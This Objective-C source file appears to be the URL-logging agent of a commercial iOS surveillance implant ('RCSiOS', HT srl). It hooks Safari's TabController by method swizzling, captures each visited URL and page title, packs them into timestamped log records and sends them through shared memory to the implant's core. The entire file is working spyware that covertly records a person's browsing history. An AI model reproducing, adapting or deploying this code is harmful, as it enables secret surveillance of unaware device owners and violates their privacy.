/*
 * RCSiOS - Agent URL
 *
 *
 * Created on 03/08/2010
 * Copyright (C) HT srl 2010. All rights reserved
 *
 */
#import <unistd.h>
#import <objc/runtime.h>

#import "RCSIAgentURL.h"
#import "RCSIDylib.h"
#import "RCSICommon.h"

//#define DEBUG

#define BROWSER_MO_SAFARI    0x00000006

static id       gAgentUrlClass = nil;
static NSDate   *gURLDate = nil;
static NSString *gPrevURL = nil;

@implementation agentURL

+ (void)setLastUrlTime
{
  @synchronized(gAgentUrlClass)
  {
    [gURLDate release];
    gURLDate = [[NSDate date] retain];
  }
}

+ (NSTimeInterval)getLastUrlTime
{
  NSTimeInterval gInterval;
  
  @synchronized(gAgentUrlClass)
  {
    if (gURLDate == nil)
    {
      gURLDate = [[NSDate date] retain];
    }
    
    gInterval = [[NSDate date] timeIntervalSinceDate: gURLDate];
  }
  
  return gInterval;
}

+ (void)setPrevUrl:(NSString*)_url
{
  @synchronized(gAgentUrlClass)
  {
    if (gPrevURL != nil)
      [gPrevURL release];
    
    gPrevURL = [_url copy];
  }
}

+ (BOOL)isDuplicateUrl:(NSString*)_url
{  
  NSTimeInterval gInterval = [agentURL getLastUrlTime];
  
  NSString *tempUrl1 = [_url stringByReplacingOccurrencesOfString: @"http://"
                                                       withString: @""];
  NSString *tempUrl2 = [_url stringByReplacingOccurrencesOfString: @"http://www."
                                                       withString: @""];
  NSString *tempUrl3 = [_url stringByReplacingOccurrencesOfString: @"www."
                                                       withString: @""];
  
  if (gPrevURL != nil &&
     ([gPrevURL isEqualToString: _url]     ||
      [gPrevURL isEqualToString: tempUrl1] ||
      [gPrevURL isEqualToString: tempUrl2] ||
      [gPrevURL isEqualToString: tempUrl3] ) &&
      gInterval <= (double)5)
  {
    return TRUE;
  }
  
  [agentURL setPrevUrl:_url];
  [agentURL setLastUrlTime];
  
  return FALSE;
}

- (void)tabDocumentDidUpdateURLHook: (id)arg1
{
  
  [self tabDocumentDidUpdateURLHook: arg1];
  
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

  struct timeval tp;
  NSString      *_windowName = nil;
  NSMutableData *windowName  = nil;
  NSString *_empty  = @"EMPTY";
  NSString *_url    = nil;
  
  if ([arg1 respondsToSelector: @selector(URL)])
    {
      _url = [[[arg1 performSelector: @selector(URL)] absoluteString] copy];
    }
  
  if (_url == nil)
    {
      [pool release];
      return;
    }
  
  if ([agentURL isDuplicateUrl:_url] == TRUE)
  {
    [_url release];
    [pool release];
    return;
  }
  
  NSData *url               = [_url dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  NSMutableData *logData    = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  NSMutableData *entryData  = [[NSMutableData alloc] init];
  
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
  short unicodeNullTerminator = 0x0000;
  
  time_t rawtime;
  struct tm *tmTemp;
  
  // Struct tm
  time (&rawtime);
  tmTemp            = gmtime(&rawtime);
  tmTemp->tm_year   += 1900;
  tmTemp->tm_mon    ++;
  
  //
  // Our struct is 0x8 bytes bigger than the one declared on win32
  // this is just a quick fix
  //
  [entryData appendBytes: (const void *)tmTemp
                  length: sizeof (struct tm) - 0x8];
  
  u_int32_t logVersion = 0x20100713;
  
  // Log Marker/Version (retrocompatibility)
  [entryData appendBytes: &logVersion
                  length: sizeof(logVersion)];
  
  // URL Name
  [entryData appendData: url];
  
  // Null terminator
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Browser Type
  int browserType = BROWSER_MO_SAFARI;
  
  [entryData appendBytes: &browserType
                  length: sizeof(browserType)];
  
  usleep(9000);
  
  // Window Name
  if ([arg1 respondsToSelector: @selector(title)])
    {
    _windowName = [[arg1 performSelector: @selector(title)] copy];
    }
  
  if (_windowName == nil)
    {
      [entryData appendData: [_empty dataUsingEncoding: NSUTF16LittleEndianStringEncoding]];
    }
  else
    {
      windowName = [[NSMutableData alloc] initWithData:
                    [_windowName dataUsingEncoding:
                     NSUTF16LittleEndianStringEncoding]];
      
      [entryData appendData: windowName];
    }
  
  // Null terminator
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Delimeter
  unsigned int del = DELIMETER;
  [entryData appendBytes: &del
                  length: sizeof(del)];
  
  [_windowName release];
  [windowName release];
 
  gettimeofday(&tp, NULL);
  
  // Log buffer
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->logID           = 0;
  shMemoryHeader->agentID         = LOG_URL;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  shMemoryHeader->flag            = 0;
  shMemoryHeader->commandDataSize = [entryData length];
  shMemoryHeader->timestamp       = (tp.tv_sec << 20) | tp.tv_usec;
  
  memcpy(shMemoryHeader->commandData,
         [entryData bytes],
         [entryData length]);
  
  [[_i_SharedMemory sharedInstance] writeIpcBlob: logData];
  
  [_url release];
  [logData release];
  [entryData release];
    
  [pool drain];
}

- (id)init
{
  self = [super init];
  
  if (self != nil)
  {
    mAgentID = AGENT_URL;
    gAgentUrlClass = self;
  }
  return self;
}

- (BOOL)start
{
  BOOL retVal = TRUE;
  
  if ([self mAgentStatus] == AGENT_STATUS_STOPPED )
    {
      Class className   = objc_getClass("TabController");
      Class classSource = [self class];
      
      if (className != nil)
        {
          IMP newImpl = class_getMethodImplementation(classSource, @selector(tabDocumentDidUpdateURLHook:));

          [self swizzleByAddingIMP:className 
                           withSEL:@selector(tabDocumentDidUpdateURL:) 
                    implementation:newImpl
                      andNewMethod:@selector(tabDocumentDidUpdateURLHook:)];
        
          /*
           * checking for a valid method swapping before return OK
           * [self validateHook];
           */
        
          [self setMAgentStatus: AGENT_STATUS_RUNNING];
        
        }
    }
  return retVal;
}

- (void)stop
{
  if ([self mAgentStatus] == AGENT_STATUS_RUNNING )
    {
      Class className = objc_getClass("TabController");
     
      if (className != nil)
        {
           IMP   oldImpl = class_getMethodImplementation(className, @selector(tabDocumentDidUpdateURLHook:));
          [self swizzleByAddingIMP:className 
                           withSEL:@selector(tabDocumentDidUpdateURL:) 
                    implementation:oldImpl
                      andNewMethod:@selector(tabDocumentDidUpdateURLHook:)];
          /*
           * checking for a valid method swapping before return OK
           * [self validateHook];
           */
          
          [self setMAgentStatus: AGENT_STATUS_STOPPED];
        } 
    }
}

@end